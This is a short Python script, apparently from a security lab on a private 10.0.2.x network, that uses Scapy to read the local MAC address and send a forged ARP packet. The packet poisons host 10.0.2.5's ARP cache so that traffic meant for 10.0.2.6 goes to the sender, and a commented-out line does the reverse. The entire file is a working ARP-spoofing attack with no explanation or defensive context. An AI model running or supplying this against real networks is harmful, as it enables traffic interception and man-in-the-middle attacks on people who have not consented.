from scapy.all import *
import uuid
def get_mac_address(): 
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:] 
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

local_mac=get_mac_address()
print ('local mac',local_mac)

#E=Ether()

arp=ARP(op=1,pdst='10.0.2.5',psrc='10.0.2.6',hwsrc=local_mac,) #posion 0.5
#arp=ARP(op=1,pdst='10.0.2.6',psrc='10.0.2.5',hwsrc=local_mac,) #posion 0.6


pkt=arp
send(pkt)





